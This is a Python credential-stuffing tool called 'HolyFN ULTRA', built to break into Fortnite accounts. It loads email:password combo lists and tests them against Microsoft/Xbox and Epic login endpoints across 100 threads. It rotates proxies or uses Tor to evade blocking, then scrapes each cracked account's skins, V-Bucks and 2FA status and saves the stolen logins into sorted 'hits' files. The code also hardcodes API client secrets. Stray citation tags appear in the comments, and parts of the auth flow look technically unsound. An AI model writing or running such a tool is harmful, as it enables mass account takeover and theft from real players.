#!/usr/bin/env python3
"""
HOLYFN ULTRA - Professional Fortnite Account Checker
Based on BoltFN, SkidChecker, and Fortnite-Checker architecture
Full capture: skins, vbucks, stw, 2fa, fa/nfa, exclusives, country, last played
"""

import os
import sys
import time
import json
import csv
import requests
import threading
import base64
import random
import socket
import socks
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
import ctypes

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Console setup
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleTitleW("HolyFN ULTRA - Fortnite Checker")
os.system('mode con: cols=100 lines=35')

class Colors:
    """Professional colors"""
    RESET = '\033[0m'
    BLACK = '\033[30m'; RED = '\033[91m'; GREEN = '\033[92m'
    YELLOW = '\033[93m'; BLUE = '\033[94m'; MAGENTA = '\033[95m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; GRAY = '\033[90m'

class HolyFNUltra:
    """Ultra-Powerful Fortnite Checker"""
    
    def __init__(self):
        self.version = "3.0"
        
        # Statistics
        self.stats = {
            'checked': 0, 'hits': 0, 'bad': 0, 'cpm': 0,
            'vbucks_1k': 0, 'vbucks_5k': 0, 'vbucks_10k': 0,
            'skins_1_9': 0, 'skins_10_49': 0, 'skins_50_99': 0, 'skins_100_199': 0, 'skins_200_plus': 0,
            'stw': 0, 'fa': 0, 'nfa': 0, 'twofa': 0, 'exclusive': 0,
            'errors': 0
        }
        
        self.start_time = time.time()
        self.running = False
        self.paused = False
        self.lock = threading.Lock()
        self.proxy_lock = threading.Lock()
        
        # Lists
        self.combos = []
        self.proxies = []
        self.working_proxies = []
        self.proxy_index = 0
        self.use_tor = False
        
        # OG/Rare skin databases [citation:1]
        self.load_skin_databases()
        
        # Create folders
        for folder in ['Results', 'Logs', 'Proxies', 'Exports']:
            os.makedirs(folder, exist_ok=True)
        
        # Epic Games API credentials
        self.client_id = "34a02cf8f4414e29b15921876da36f9a"
        self.client_secret = "daafbcccf7394631a6e66b1c9e0cbd84"
        self.auth = base64.b64encode(f"{self.client_id}:{self.client_secret}".encode()).decode()
        
        # API Endpoints
        self.oauth = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        self.account_info = "https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{}"
        self.profile = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{}/client/QueryProfile?profileId={}&rvn=-1"
        self.entitlements = "https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/{}/entitlements"
        self.stats_api = "https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/{}"
        self.external_auths = "https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{}/externalAuths"
        
        # Microsoft/Xbox endpoints [citation:1]
        self.xbl_auth = "https://user.auth.xboxlive.com/user/authenticate"
        self.xsts_auth = "https://xsts.auth.xboxlive.com/xsts/authorize"
    
    def load_skin_databases(self):
        """Load OG and rare skins from database file [citation:1]"""
        self.og_skins = [
            # Season 0-3 OG
            "Renegade Raider", "Aerial Assault Trooper", "Skull Trooper",
            "Ghoul Trooper", "Recon Expert", "Black Knight", "Blue Squire",
            "Royale Knight", "Dark Voyager", "Sparkle Specialist", "John Wick",
            "The Reaper", "Elite Agent", "Raptor", "Rust Lord", "Battlehawk",
            "Warpaint", "Carbide", "Valor", "Omega", "Zoey", "Rook",
            # Promotional
            "Galaxy", "Galaxy Scout", "Double Helix", "Eon", "Honor Guard",
            "Neon Glow", "Vertex", "Wonder", "Glow", "Royale Bomber",
            # Limited
            "Minty", "Frostbite", "Snowfoot", "Tinseltoes", "Codename E.L.F."
        ]
        
        self.rare_skins = [
            "Merry Marauder", "Ginger Gunner", "Crackshot", "Yuletide Ranger",
            "Frozen Knight", "Frozen Raven", "Frozen Red Knight", "Frozen Love Ranger",
            "Dark Bomber", "Dark Raptor", "Dark Rex", "Dark Skully",
            "Red Nosed Raider", "Arachnid", "Webbreaker", "Skull Commander",
            "Power Chord", "Rockout", "Stage Slayer"
        ]
    
    def clear(self):
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_time(self):
        """Get formatted runtime"""
        elapsed = int(time.time() - self.start_time)
        h = elapsed // 3600
        m = (elapsed % 3600) // 60
        s = elapsed % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    
    def get_combo_count(self):
        """Get combo count"""
        if os.path.exists('combo.txt'):
            with open('combo.txt', 'r', errors='ignore') as f:
                return sum(1 for l in f if ':' in l)
        return 0
    
    def banner(self):
        """Print banner"""
        print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}                     HOLYFN ULTRA v{self.version}                        {Colors.CYAN}║
║{Colors.GRAY}              Microsoft Auth | Full Capture | Proxy/Tor          {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}""")
    
    def stats_screen(self):
        """Print statistics - BoltFN style [citation:1]"""
        runtime = self.get_time()
        
        print(f"""
{Colors.WHITE}┌──────────────────────────────────────────────────────────────────┐
│{Colors.YELLOW} CHECKED : {self.stats['checked']:>8}  {Colors.GREEN}HITS : {self.stats['hits']:>8}  {Colors.RED}BAD : {self.stats['bad']:>8}  {Colors.CYAN}CPM : {self.stats['cpm']:>8}{Colors.WHITE} │
├──────────────────────────────────────────────────────────────────┤
│{Colors.YELLOW} V-BUCKS : 1K[{self.stats['vbucks_1k']:>4}] 5K[{self.stats['vbucks_5k']:>4}] 10K[{self.stats['vbucks_10k']:>4}]{Colors.WHITE}                           │
│{Colors.GREEN} SKINS   : 1-9[{self.stats['skins_1_9']:>4}] 10-49[{self.stats['skins_10_49']:>4}] 50-99[{self.stats['skins_50_99']:>4}] 100-199[{self.stats['skins_100_199']:>4}] 200+[{self.stats['skins_200_plus']:>4}]{Colors.WHITE} │
│{Colors.MAGENTA} STW:{self.stats['stw']:>4}  2FA:{self.stats['twofa']:>4}  FA:{self.stats['fa']:>4}  NFA:{self.stats['nfa']:>4}  EX:{self.stats['exclusive']:>4}{Colors.WHITE}                    │
├──────────────────────────────────────────────────────────────────┤
│{Colors.CYAN} RUNTIME : {runtime}  PROXIES : {len(self.working_proxies)}/{len(self.proxies)}  TOR:{'ON' if self.use_tor else 'OFF'}  ERR:{self.stats['errors']}{Colors.WHITE} │
└──────────────────────────────────────────────────────────────────┘{Colors.RESET}""")
    
    def menu(self):
        """Main menu - clean and powerful like BoltFN [citation:1]"""
        print(f"""
{Colors.WHITE}══════════════════════════════════════════════════════════════════════
{Colors.CYAN}                         MAIN MENU
{Colors.WHITE}══════════════════════════════════════════════════════════════════════

{Colors.GREEN}  [1] START CHECKING     [2] LOAD COMBO     [3] LOAD PROXY
{Colors.GREEN}  [4] VALIDATE PROXIES   [5] TOGGLE TOR     [6] EXPORT CSV
{Colors.GREEN}  [7] VIEW RESULTS       [8] CLEAN RESULTS  [9] SETTINGS
{Colors.RED}  [0] EXIT

{Colors.CYAN}──────────────────────────────────────────────────────────────────
{Colors.YELLOW}  THREADS: 100  |  ACCOUNTS: {self.get_combo_count()}  |  PROXY MODE: {'ON' if self.proxies else 'OFF'}
{Colors.WHITE}══════════════════════════════════════════════════════════════════════{Colors.RESET}""")
    
    def load_proxies(self, file):
        """Load proxies from file - BoltFN format [citation:1]"""
        try:
            with open(file, 'r') as f:
                self.proxies = [p.strip() for p in f if p.strip()]
            
            # Format proxies
            formatted = []
            for p in self.proxies:
                if '://' not in p:
                    p = 'http://' + p
                formatted.append(p)
            
            self.proxies = formatted
            return True
        except Exception as e:
            print(f"{Colors.RED}Error: {e}{Colors.RESET}")
            return False
    
    def validate_proxies(self):
        """Test proxies - keep working ones"""
        if not self.proxies:
            print(f"{Colors.RED}No proxies loaded{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}Validating {len(self.proxies)} proxies...{Colors.RESET}")
        working = []
        
        # Test first 50 proxies
        for i, proxy in enumerate(self.proxies[:50]):
            try:
                r = requests.get(
                    'http://www.google.com',
                    proxies={'http': proxy, 'https': proxy},
                    timeout=5
                )
                if r.status_code == 200:
                    working.append(proxy)
                    print(f"{Colors.GREEN}[{i+1}] ✓ {proxy}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[{i+1}] ✗ {proxy}{Colors.RESET}")
            except:
                print(f"{Colors.RED}[{i+1}] ✗ {proxy}{Colors.RESET}")
        
        self.working_proxies = working
        print(f"{Colors.GREEN}Working: {len(working)}/{len(self.proxies)}{Colors.RESET}")
    
    def get_proxy(self):
        """Get next working proxy with thread safety [citation:2]"""
        with self.proxy_lock:
            if self.use_tor:
                # Use Tor proxy (like SkidChecker) [citation:5]
                return {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
            
            if not self.working_proxies:
                return None
            
            proxy = self.working_proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.working_proxies)
            return {'http': proxy, 'https': proxy}
    
    def microsoft_auth(self, email, password):
        """Microsoft/Xbox authentication - like BoltFN [citation:1]"""
        try:
            # Step 1: Xbox Live auth
            headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            data = {
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT",
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={email};{password}"
                }
            }
            
            r = requests.post(self.xbl_auth, json=data, headers=headers, timeout=10)
            if r.status_code != 200:
                return None
            
            xbl_token = r.json().get('Token')
            user_hash = r.json().get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            
            if not xbl_token or not user_hash:
                return None
            
            # Step 2: XSTS token
            data = {
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT",
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbl_token]
                }
            }
            
            r = requests.post(self.xsts_auth, json=data, headers=headers, timeout=10)
            if r.status_code != 200:
                return None
            
            xsts_token = r.json().get('Token')
            
            # Step 3: Epic exchange
            headers = {
                'Authorization': f'basic {self.auth}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'grant_type': 'exchange_code',
                'exchange_code': xsts_token,
                'token_type': 'eg1'
            }
            
            r = requests.post(self.oauth, data=data, headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            
            return None
            
        except Exception as e:
            return None
    
    def check_account(self, account):
        """Check single account - full capture [citation:1][citation:3]"""
        try:
            if ':' not in account:
                with self.lock: self.stats['bad'] += 1
                return None
            
            email, password = account.strip().split(':', 1)
            
            # Get proxy
            proxies = self.get_proxy()
            
            # Authenticate via Microsoft (like BoltFN)
            token_data = self.microsoft_auth(email, password)
            if not token_data:
                with self.lock: self.stats['bad'] += 1
                return None
            
            access_token = token_data.get('access_token')
            account_id = token_data.get('account_id')
            
            if not access_token or not account_id:
                with self.lock: self.stats['bad'] += 1
                return None
            
            # Headers for subsequent requests
            headers = {'Authorization': f'Bearer {access_token}'}
            
            # Get account info
            r = requests.get(self.account_info.format(account_id), 
                           headers=headers, proxies=proxies, timeout=10)
            acc_info = r.json() if r.status_code == 200 else {}
            
            epic_email = acc_info.get('email', 'N/A')
            twofa = acc_info.get('tfaEnabled', False)
            display = acc_info.get('displayName', 'Unknown')
            country = acc_info.get('country', 'N/A')
            account_created = acc_info.get('accountCreated', 'N/A')
            
            # Get skins from Athena profile
            r = requests.post(self.profile.format(account_id, 'athena'),
                            headers=headers, json={}, proxies=proxies, timeout=10)
            
            skins = 0
            skin_names = []
            if r.status_code == 200:
                profile_data = r.json()
                if 'profileChanges' in profile_data:
                    for change in profile_data['profileChanges']:
                        if 'profile' in change:
                            items = change['profile'].get('items', {})
                            for item in items.values():
                                tid = item.get('templateId', '')
                                if tid.startswith('AthenaCharacter:'):
                                    skins += 1
                                    skin_id = tid.replace('AthenaCharacter:', '')
                                    skin_names.append(skin_id)
            
            # Check for OG/rare skins
            og_found = []
            rare_found = []
            for skin in skin_names:
                if skin in self.og_skins:
                    og_found.append(skin)
                elif skin in self.rare_skins:
                    rare_found.append(skin)
            
            # Get V-Bucks from common_core
            r = requests.post(self.profile.format(account_id, 'common_core'),
                            headers=headers, json={}, proxies=proxies, timeout=10)
            
            vbucks = 0
            if r.status_code == 200:
                profile_data = r.json()
                if 'profileChanges' in profile_data:
                    for change in profile_data['profileChanges']:
                        if 'profile' in change:
                            items = change['profile'].get('items', {})
                            for item in items.values():
                                if 'Currency:Mtx' in item.get('templateId', ''):
                                    vbucks = item.get('quantity', 0)
                                    break
            
            # Check STW
            r = requests.get(self.entitlements.format(account_id),
                           headers=headers, proxies=proxies, timeout=10)
            
            stw = False
            if r.status_code == 200:
                for e in r.json():
                    if 'Fortnite_Founder' in e.get('entitlementName', ''):
                        stw = True
                        break
            
            # Get last played
            r = requests.get(self.stats_api.format(account_id),
                           headers=headers, proxies=proxies, timeout=10)
            
            last_played = 'Never'
            if r.status_code == 200:
                for stat in r.json().get('stats', []):
                    if stat.get('statName') == 'last_match_end_datetime':
                        last_played = stat.get('value', 'Never').split('T')[0]
                        break
            
            # Get linked accounts
            r = requests.get(self.external_auths.format(account_id),
                           headers=headers, proxies=proxies, timeout=10)
            
            linked = []
            if r.status_code == 200:
                for link in r.json():
                    linked.append(link.get('type', 'Unknown'))
            
            # FA check
            is_fa = epic_email.lower() == email.lower() if epic_email != 'N/A' else False
            
            # Quality score
            quality = 0
            quality += min(skins, 200) // 2
            quality += vbucks // 200
            if stw: quality += 15
            if twofa: quality += 10
            if is_fa: quality += 10
            if og_found: quality += 20
            elif rare_found: quality += 10
            quality = min(quality, 100)
            
            # Hit if has value
            is_hit = skins > 0 or vbucks > 0 or stw or og_found or rare_found
            
            with self.lock:
                self.stats['checked'] += 1
                
                if is_hit:
                    self.stats['hits'] += 1
                    
                    # Update V-Bucks stats
                    if vbucks >= 1000: self.stats['vbucks_1k'] += 1
                    if vbucks >= 5000: self.stats['vbucks_5k'] += 1
                    if vbucks >= 10000: self.stats['vbucks_10k'] += 1
                    
                    # Update skin stats (BoltFN style categories) [citation:1]
                    if skins <= 9:
                        self.stats['skins_1_9'] += 1
                    elif skins <= 49:
                        self.stats['skins_10_49'] += 1
                    elif skins <= 99:
                        self.stats['skins_50_99'] += 1
                    elif skins <= 199:
                        self.stats['skins_100_199'] += 1
                    else:
                        self.stats['skins_200_plus'] += 1
                    
                    if stw: self.stats['stw'] += 1
                    if twofa: self.stats['twofa'] += 1
                    if is_fa: self.stats['fa'] += 1
                    else: self.stats['nfa'] += 1
                    
                    if og_found or rare_found or stw or skins >= 100 or vbucks >= 5000:
                        self.stats['exclusive'] += 1
                    
                    # Save hit
                    self.save_hit({
                        'email': email, 'password': password,
                        'display': display, 'epic_email': epic_email,
                        'skins': skins, 'skin_names': ','.join(skin_names[:20]),
                        'vbucks': vbucks, 'stw': stw, 'twofa': twofa,
                        'fa': is_fa, 'country': country,
                        'last_played': last_played, 'quality': quality,
                        'og_found': ','.join(og_found) if og_found else '',
                        'rare_found': ','.join(rare_found) if rare_found else '',
                        'linked': ','.join(linked), 'created': account_created
                    })
                    
                    return True
                else:
                    self.stats['bad'] += 1
                    return None
                    
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
                self.stats['bad'] += 1
            return None
    
    def save_hit(self, data):
        """Save hit to files - BoltFN organization [citation:1]"""
        try:
            # Main hits file
            line = (f"{data['email']}:{data['password']} | {data['display']} | "
                   f"Skins:{data['skins']} | VB:{data['vbucks']} | "
                   f"2FA:{'Y' if data['twofa'] else 'N'} | STW:{'Y' if data['stw'] else 'N'} | "
                   f"{'FA' if data['fa'] else 'NFA'} | Quality:{data['quality']} | "
                   f"Country:{data['country']} | Last:{data['last_played']}\n")
            
            with open('Results/hits.txt', 'a', encoding='utf-8') as f:
                f.write(line)
            
            # Category files
            if data['vbucks'] >= 1000:
                with open('Results/vbucks_1k.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']}\n")
            
            if data['vbucks'] >= 5000:
                with open('Results/vbucks_5k.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']}\n")
            
            # Skin categories (BoltFN style)
            if data['skins'] <= 9:
                with open('Results/skins_1-9.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | {data['skins']} skins\n")
            elif data['skins'] <= 49:
                with open('Results/skins_10-49.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | {data['skins']} skins\n")
            elif data['skins'] <= 99:
                with open('Results/skins_50-99.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | {data['skins']} skins\n")
            elif data['skins'] >= 100:
                with open('Results/skins_100+.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | {data['skins']} skins\n")
            
            # OG/Rare skins
            if data['og_found']:
                with open('Results/og_skins.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | OG: {data['og_found']}\n")
            
            if data['rare_found']:
                with open('Results/rare_skins.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | Rare: {data['rare_found']}\n")
            
            if data['stw']:
                with open('Results/stw.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']}\n")
            
            if data['fa']:
                with open('Results/fa.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']}\n")
            
            if data['twofa']:
                with open('Results/2fa.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']}\n")
            
            if data['quality'] >= 80:
                with open('Results/premium.txt', 'a') as f:
                    f.write(f"{data['email']}:{data['password']} | Quality:{data['quality']}\n")
                    
        except Exception as e:
            pass
    
    def export_csv(self):
        """Export results to CSV [citation:3]"""
        if not os.path.exists('Results/hits.txt'):
            print(f"{Colors.RED}No hits to export{Colors.RESET}")
            input("Press Enter...")
            return
        
        filename = f"Exports/holyfn_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['Email', 'Password', 'Display', 'Skins', 'V-Bucks', '2FA', 'STW', 'Type', 'Quality', 'Country', 'Last Played'])
            
            with open('Results/hits.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    # Parse line (simplified)
                    parts = line.split('|')
                    if len(parts) >= 8:
                        writer.writerow([p.strip() for p in parts[:11]])
        
        print(f"{Colors.GREEN}Exported to {filename}{Colors.RESET}")
        input("Press Enter...")
    
    def start_check(self):
        """Start checking - multi-threaded [citation:2]"""
        if not os.path.exists('combo.txt'):
            print(f"{Colors.RED}No combo.txt found{Colors.RESET}")
            input("Press Enter...")
            return
        
        # Load combos
        with open('combo.txt', 'r', encoding='utf-8', errors='ignore') as f:
            self.combos = [l.strip() for l in f if ':' in l and l.strip()]
        
        if not self.combos:
            print(f"{Colors.RED}No valid combos{Colors.RESET}")
            input("Press Enter...")
            return
        
        print(f"{Colors.GREEN}Checking {len(self.combos)} accounts with 100 threads...{Colors.RESET}")
        self.running = True
        self.start_time = time.time()
        
        # Reset stats
        for k in self.stats:
            self.stats[k] = 0
        
        # Process with thread pool - 100 threads for maximum speed
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(self.check_account, c): c for c in self.combos}
            
            done = 0
            for future in as_completed(futures):
                if not self.running:
                    executor.shutdown(wait=False)
                    break
                
                future.result()
                done += 1
                
                # Update CPM
                elapsed = time.time() - self.start_time
                if elapsed > 0:
                    self.stats['cpm'] = int((done / elapsed) * 60)
                
                # Update screen every 10 checks
                if done % 10 == 0:
                    self.clear()
                    self.banner()
                    self.stats_screen()
                    self.menu()
        
        self.running = False
        print(f"{Colors.GREEN}Done! Hits: {self.stats['hits']}{Colors.RESET}")
        input("Press Enter...")
    
    def load_combo(self):
        """Load combo file"""
        path = input("Combo file path: ").strip().strip('"')
        if os.path.exists(path):
            import shutil
            shutil.copy(path, 'combo.txt')
            count = self.get_combo_count()
            print(f"{Colors.GREEN}Loaded {count} accounts{Colors.RESET}")
        else:
            print(f"{Colors.RED}File not found{Colors.RESET}")
        input("Press Enter...")
    
    def load_proxy_file(self):
        """Load proxy file"""
        path = input("Proxy file path: ").strip().strip('"')
        if os.path.exists(path) and self.load_proxies(path):
            print(f"{Colors.GREEN}Loaded {len(self.proxies)} proxies{Colors.RESET}")
        else:
            print(f"{Colors.RED}Failed to load proxies{Colors.RESET}")
        input("Press Enter...")
    
    def toggle_tor(self):
        """Toggle Tor mode (like SkidChecker) [citation:5]"""
        self.use_tor = not self.use_tor
        status = "ON" if self.use_tor else "OFF"
        print(f"{Colors.GREEN}Tor mode: {status}{Colors.RESET}")
        print(f"{Colors.YELLOW}Make sure Tor is running on port 9050{Colors.RESET}")
        input("Press Enter...")
    
    def view_results(self):
        """View results folder"""
        self.clear()
        self.banner()
        
        print(f"\n{Colors.WHITE}Results Folder:{Colors.RESET}\n")
        
        if os.path.exists('Results'):
            files = os.listdir('Results')
            if files:
                for f in sorted(files):
                    size = os.path.getsize(f'Results/{f}')
                    print(f"  {Colors.GREEN}{f:<25} {Colors.YELLOW}({size:,} bytes){Colors.RESET}")
            else:
                print(f"  {Colors.YELLOW}No result files{Colors.RESET}")
        else:
            print(f"  {Colors.YELLOW}Results folder not found{Colors.RESET}")
        
        print()
        input("Press Enter...")
    
    def clean_results(self):
        """Clean results folder"""
        confirm = input(f"{Colors.RED}Delete all results? (y/n): {Colors.RESET}")
        if confirm.lower() == 'y' and os.path.exists('Results'):
            for f in os.listdir('Results'):
                os.remove(f'Results/{f}')
            print(f"{Colors.GREEN}Results cleaned{Colors.RESET}")
        input("Press Enter...")
    
    def settings(self):
        """Settings menu"""
        print(f"{Colors.YELLOW}Settings - Edit config.ini manually{Colors.RESET}")
        input("Press Enter...")
    
    def run(self):
        """Main loop"""
        while True:
            self.clear()
            self.banner()
            self.stats_screen()
            self.menu()
            
            choice = input(f"\n{Colors.YELLOW}Select: {Colors.RESET}").strip()
            
            if choice == '1':
                self.start_check()
            elif choice == '2':
                self.load_combo()
            elif choice == '3':
                self.load_proxy_file()
            elif choice == '4':
                self.validate_proxies()
                input("Press Enter...")
            elif choice == '5':
                self.toggle_tor()
            elif choice == '6':
                self.export_csv()
            elif choice == '7':
                self.view_results()
            elif choice == '8':
                self.clean_results()
            elif choice == '9':
                self.settings()
            elif choice == '0':
                print(f"{Colors.GREEN}Goodbye{Colors.RESET}")
                break

if __name__ == '__main__':
    try:
        app = HolyFNUltra()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Exiting...{Colors.RESET}")